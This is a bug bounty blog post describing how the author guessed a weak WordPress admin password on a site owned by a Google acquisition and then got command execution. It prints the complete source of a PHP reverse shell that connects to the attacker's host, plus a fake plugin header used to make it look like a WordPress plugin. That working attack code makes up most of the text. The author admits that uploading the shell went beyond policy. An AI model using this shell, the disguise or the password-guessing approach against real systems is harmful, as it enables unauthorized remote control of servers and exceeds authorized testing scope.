---
author: AnirudhAnand
layout: post
title: How I got a shell on Google Acquisition ?
categories:
- bugbounty
summary: Getting a shell on Google Acquisition.
---
Getting a place on [Google hall of fame](https://www.google.com/about/appsecurity/hall-of-fame/archive/){:target="_blank"} is a milestone for any bug bounty hunter. With this in mind, I started reading Google's Vulnerability Reward Program and noticed that all the Google Acquisitions are a part of the program once it passes 6 months mark. So I decided to read more about recent Google Acquisition. Wikipedia has an aswesome page which contains an entire list of the [companies acquired by Google](https://en.wikipedia.org/wiki/List_of_mergers_and_acquisitions_by_Google){:target="_blank"}. I decided to check the companies which were acquired in 2014 so that I was assured it is eligible for the bounty program.

After some reconnaisance, I decided to fix my target on `songza.com` which was acquired by Google in July 2014. When I visited the website, I got redirected to `daily.songza.com` which was running on Wordpress 3.8.1. The Wordpress version 3.8.1 itself has several vulnerabilities (latest version is 4.4.2 at the time of writing) but I was not interested in those. I decided to enumerate the Wordpress users available so that I can try logging in with them using common passwords.

After the enumeration, I saw that the site has 9 users. I manually tried logging in with some common password formats. One of them turned out to be correct and I got logged in ! I couldn't believe my eyes at first but the logged in user was an Administrator. One of the usernames among the enumerated one was `Michael` and his password was nothing but his username (`Michael`) itself !

So, now I got the admin panel of the site. Now I had 2 options:

1. Report this to Google now along with its after effects or
2. Upload a **PHP shell** as a valid Wordpress plugin and use it to achieve command execution !

I believe that by now you would have guessed which option I would have chosen. So I quickly searched for a PHP reverse shell and got one:

[Original Author: PentestMonkey](http://pentestmonkey.net/tools/php-reverse-shell){:target="_blank"}

{% highlight php lineos %}

set_time_limit (0);
$VERSION = "1.0";
$ip = 'xxx.xxx.xxx.xxx';  // CHANGE THIS
$port = 8080;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$stringn";
	}
}

?> 

{% endhighlight %}

Now I added some comments to the top of the page so that the shell will truly look like a Wordpress plugin with Author information.

```
/*
*     Plugin Name: Shell
*     Plugin URI: https://blog.0daylabs.com
*     Author: a0xnirudh
*     Version: 1.0
*     Author URI: https://blog.0daylabs.com
*                             
*/
```

After this, I zipped the PHP shell and uploaded the plugin. The moment I clicked on `Activate plugin` on the dashboard, I got a reverse shell back to my server. I can now execute commands on a Google Acquisition !! :O

I reported this to Google but they were not happy since I uploaded a shell. Now they have to involve the Incident response team to secure the server back. They also warned me that **uploading shells** was against their policy but since it was my first bug report, they didn't disqualify it. 

Next time when you get a vulnerability using which you are sure that you can upload a shell, **better stop it there and report** (I know how hard it is to stop there but just report it and let it go or else you might get disqualified) !

Google payed me $1337 for this report and listed my name on their [Security Hall of Fame](https://www.google.com/about/appsecurity/hall-of-fame/archive/). 
